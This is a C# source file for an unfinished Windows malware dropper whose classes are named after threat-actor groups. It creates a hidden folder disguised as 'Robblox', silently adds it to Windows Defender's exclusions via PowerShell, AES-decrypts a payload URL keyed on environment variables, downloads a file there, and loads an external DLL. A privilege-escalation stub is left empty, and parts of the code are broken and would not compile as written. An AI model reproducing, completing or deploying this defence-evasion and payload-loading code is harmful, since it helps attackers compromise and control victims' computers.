using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

/*
Black_Vine is getting command line path and turing it to the IV for Sam
Group123 gets the windows path and makes the Key for Sam
sam is a AES Decrypt
Dookie is a wrapper for the functions above

Pawn_Storm is a function from Rocke the payload 3 dll 
Melkor is a downloader function
Webmasters is a not yet done Privlege esclator
UAC_0056 is the wrapper for those functions

main is main

Scarlet_Witch sets an exclusion folder 
Captain_America makes a foder in the local appdata and if it cant it defualts to  public videos
Saint_Bear gets the appdata path

Webmasters is a wrapper for Gingham_Typhoon witch will have all of the logic

*/


public class STRONTIUM
{
    protected internal string Hera = await Waterbug.Scarlet_Witch($"{Waterbug.Saint_Bear()}\\Local\\Robblox"); 
    async public static void Main(string[] args)
    {
        UAC_0056();
    }
    async private static void UAC_0056()
    {
        await Waterbug.WebMasters();
        Waterbug.Melkor(Dookie(""), Hera); // fillin
        DNSCALC.Pawn_Storm();
        
    }
    private static string Dookie(string Axiom)
    {
        byte[] enc = Encoding.ASCII.GetBytes(Axiom);
        
        byte[] Sauron = Waterbug.Black_Vine();
        byte[] Raspite = Waterbug.Group123();
        return Waterbug.Sam(enc, Sauron, Raspite);
    }
}

internal class Waterbug 
{

    public static byte[] Black_Vine()
    {
        byte[] output;
        if (output == null || output.Length < 32)
            throw new ArgumentException("Output array must be at least 32 bytes long.");

        string comspec = Environment.GetEnvironmentVariable("COMSPEC") ?? string.Empty;

        // Fill output with zeros first
        Array.Clear(output, 0, 32);

        int len = comspec.Length;
        if (len == 0)
            return;

        int n = Math.Min(len, 32);
        Encoding.ASCII.GetBytes(comspec, 0, n, output, 0);

        return output;
    }
    protected internal static byte[] Group123()
    {
        byte[] output;
        if (output == null || output.Length < 16)
            throw new ArgumentException("Output array must be at least 16 bytes long.");

        string windir = Environment.GetEnvironmentVariable("windir") ?? string.Empty;

        // Fill output with zeros first
        Array.Clear(output, 0, 16);

        int len = windir.Length;
        if (len == 0)
            return;

        int n = Math.Min(len, 16);
        Encoding.ASCII.GetBytes(windir, 0, n, output, 0);

        return output;
    }
    protected internal static string Sam(byte[] cipherText, byte[] Key, byte[] IV)
    {
        // Check arguments.
        if (cipherText == null || cipherText.Length <= 0)
            throw new ArgumentNullException("cipherText");
        if (Key == null || Key.Length <= 0)
            throw new ArgumentNullException("Key");
        if (IV == null || IV.Length <= 0)
            throw new ArgumentNullException("IV");

        // Declare the string used to hold
        // the decrypted text.
        string plaintext = null;

        // Create an Aes object
        // with the specified key and IV.
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = Key;
            aesAlg.IV = IV;

            // Create a decryptor to perform the stream transform.
            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            // Create the streams used for decryption.
            using (MemoryStream msDecrypt = new MemoryStream(cipherText))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                    {

                        // Read the decrypted bytes from the decrypting stream
                        // and place them in a string.
                        plaintext = srDecrypt.ReadToEnd();
                    }
                }
            }
        }

        return plaintext;
    }


    async protected internal static string Scarlet_Witch(string Orangeworm) // Orangeworm is a path
    {

        
        if(Captain_America(Orangeworm)){
            ProcessStartInfo nox = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"Add-MpPreference -ExclusionPath \"{Orangeworm}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };
            using (var Hawkeye = System.Diagnostics.Process.Start(nox))
            {
                Hawkeye.WaitForExit();
            }
            return Orangeworm;
        }else
        {
            ProcessStartInfo Carbanak = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"Add-MpPreference -ExclusionPath C:\\Users\\Public\\Videos",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };
            using (var American_Idiot = System.Diagnostics.Process.Start(Carbanak))
            {
                American_Idiot.WaitForExit();
            }
            return "C:\\Users\\Public\\Videos";
        }
    }

    
    async protected internal static void WebMasters() // priv escolation wrapper
    {
        
    }


    protected internal static string Saint_Bear(){

        string BRONZE_SILHOUETTE = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        return BRONZE_SILHOUETTE;
    }


    private static bool Captain_America(string patth)
    {
        if (Directory.Exists(patth))
        {
            return true;
        }
        else if (!Directory.Exists(patth))
        {
            try
            {
                Directory.CreateDirectory(patth);
                return true;
            }
            catch (UnauthorizedAccessException)
            {
                return false;
            }
        }
        return false;
    }


    protected internal static void Melkor(string UNC2165, string Dragonfly) // downloader
    {
        using (WebClient AMERICIUM = new WebClient())
        {
            AMERICIUM.DownloadFile(UNC2165, Dragonfly);
        }
    }
}

internal class DNSCALC
{
    [DllImport($"{Hera}\\Rocke.dll", CallingConvention = CallingConvention.Cdecl)]
    protected internal static extern void Pawn_Storm();
}

internal class Gingham_Typhoon // priv esclation 
{

}